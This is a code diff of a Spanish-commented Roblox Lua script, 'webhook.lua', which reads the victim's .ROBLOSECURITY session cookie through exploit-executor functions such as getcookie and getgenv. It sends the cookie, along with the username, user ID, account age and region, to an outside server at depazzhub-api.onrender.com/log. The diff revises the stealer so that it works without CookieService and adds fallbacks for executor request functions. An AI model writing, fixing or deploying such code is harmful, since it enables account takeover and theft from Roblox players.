@@ -1,69 +1,36 @@
--- webhook.lua - VERSIÓN COMPLETA Y FUNCIONAL
+
+-- webhook.lua - VERSIÓN CORREGIDA (Sin CookieService)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local CookieService = game:GetService("CookieService")
 local LocalizationService = game:GetService("LocalizationService")
 
--- Funciones de Libraries.lua integradas
+-- Función para obtener cookies (sin CookieService)
 local function GetCookies()
     local cookies = {}
     
-    local savedCookies = CookieService:GetCookies()
-    if savedCookies then
-        for _, cookie in ipairs(savedCookies) do
-            table.insert(cookies, cookie)
-        end
+    -- Intentar con getcookie() (función de executors)
+    local success, cookie = pcall(getcookie)
+    if success and cookie and cookie ~= "" then
+        table.insert(cookies, {
+            Name = ".ROBLOSECURITY",
+            Value = cookie,
+            SameSite = "None",
+            Path = "/",
+            Domain = "www.roblox.com"
+        })
     end
     
+    -- Intentar con getgenv
     if #cookies == 0 then
-        local cookiesEnv = getgenv("_ROBLOX_COOKIES")
-        if cookiesEnv and type(cookiesEnv) == "table" then
-            for _, cookie in ipairs(cookiesEnv) do
-                table.insert(cookies, cookie)
-            end
-        end
-    end
-    
-    if #cookies == 0 then
-        local cookieValue = getgenv("_ROBLOSECURITY")
+        local cookieValue = getgenv("_ROBLOSECURITY") or getgenv("ROBLOSECURITY")
         if cookieValue and cookieValue ~= "" then
             table.insert(cookies, {
                 Name = ".ROBLOSECURITY",
-                Value = cookieValue,
+                Value = tostring(cookieValue),
                 SameSite = "None",
                 Path = "/",
                 Domain = "www.roblox.com"
             })
-        end
-    end
-    
-    if #cookies == 0 then
-        local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
-        if savedCookie ~= "" and savedCookie ~= nil then
-            table.insert(cookies, {
-                Name = ".ROBLOSECURITY",
-                Value = savedCookie,
-                SameSite = "None",
-                Path = "/",
-                Domain = "www.roblox.com"
-            })
-        end
-    end
-    
-    if #cookies == 0 then
-        local names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "cookie_value", "RBX_COOKIE"}
-        for _, name in ipairs(names) do
-            local val = getgenv(name)
-            if val and val ~= "" and val ~= nil then
-                table.insert(cookies, {
-                    Name = ".ROBLOSECURITY",
-                    Value = tostring(val),
-                    SameSite = "None",
-                    Path = "/",
-                    Domain = "www.roblox.com"
-                })
-                break
-            end
         end
     end
     
@@ -82,16 +49,10 @@ end
 
 local function Request(options)
     options = options or {}
-    
     local url = options.Url or ""
     local method = options.Method or "GET"
     local headers = options.Headers or {}
     local body = options.Body
-    local timeout = options.Timeout or 15
-    
-    if url == "" then
-        url = options.TargetUrl or ""
-    end
     
     if url == "" then
         error("Error: No se especificó URL")
@@ -114,32 +75,29 @@ local function Request(options)
         bodyString = HttpService:JSONEncode(body)
     end
     
-    local fullUrl = url
-    
-    local _RbxRequest = getgenv("_RbxRequest")
-    if _RbxRequest then
-        local response = _RbxRequest(fullUrl, method, bodyString, fullHeaders)
-        if response then
-            return response
-        end
-    end
-    
-    local customRequest = getgenv("request")
+    -- Intentar con request() del executor
+    local customRequest = getgenv("request") or (getgenv("syn") and getgenv("syn").request)
     if customRequest then
-        local response = customRequest({
-            Url = fullUrl,
-            Method = method,
-            Body = bodyString,
-            Headers = fullHeaders
-        })
-        if response then
+        local success, response = pcall(function()
+            return customRequest({
+                Url = url,
+                Method = method,
+                Body = bodyString,
+                Headers = fullHeaders
+            })
+        end)
+        if success and response then
             return response
         end
     end
     
-    local httpService = HttpService
+    -- Fallback a HttpService
     local success, response = pcall(function()
-        return httpService:PostAsync(fullUrl, bodyString, Enum.HttpContentType.ApplicationJson, false)
+        if method == "GET" then
+            return HttpService:GetAsync(url, false)
+        else
+            return HttpService:PostAsync(url, bodyString, Enum.HttpContentType.ApplicationJson, false)
+        end
     end)
     
     if success and response then
@@ -168,21 +126,16 @@ end
 
 local function GetAccountAge()
     local player = Players.LocalPlayer
-    
     if not player then return "Jugador no encontrado" end
-
-    local days = player.AccountAge 
-
+    
+    local days = player.AccountAge
     local years = math.floor(days / 365)
     local months = math.floor((days % 365) / 30)
     
-    local ageText = days .. " días"
-    
     if years > 0 then
-        ageText = string.format("%d años, %d meses (%d días)", years, months, days)
+        return string.format("%d años, %d meses (%d días)", years, months, days)
     end
-    
-    return ageText
+    return days .. " días"
 end
 
 local function GetRegion()
@@ -193,38 +146,28 @@ local function ToJson(obj)
     return HttpService:JSONEncode(obj)
 end
 
--- Funciones exportadas
-local Libraries = {
-    GetCookies = GetCookies,
-    GetCookieValue = GetCookieValue,
-    Request = Request,
-    HttpPost = HttpPost,
-    GetAccountAge = GetAccountAge,
-    GetRegion = GetRegion,
-    ToJson = ToJson
-}
-
--- Código principal del webhook
+-- Código principal
 local success, result = pcall(function()
     local player = Players.LocalPlayer
     local placeId = game.PlaceId
+    
+    local cookieValue = GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
     
     local data = {
         username = player.Name,
         displayName = player.DisplayName,
         userId = player.UserId,
         gameId = placeId,
-        accountAge = Libraries.GetAccountAge(),
-        region = Libraries.GetRegion(),
-        cookie = ".ROBLOSECURITY=" .. Libraries.GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
+        accountAge = GetAccountAge(),
+        region = GetRegion(),
+        cookie = ".ROBLOSECURITY=" .. cookieValue
     }
     
     print("📤 Enviando webhook...")
     print("  Usuario: " .. player.Name)
     print("  User ID: " .. tostring(player.UserId))
-    print("  API: https://depazzhub-api.onrender.com/log")
     
-    local response = Libraries.HttpPost("https://depazzhub-api.onrender.com/log", data)
+    local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
     if response then
         print("✅ Webhook enviado correctamente!")
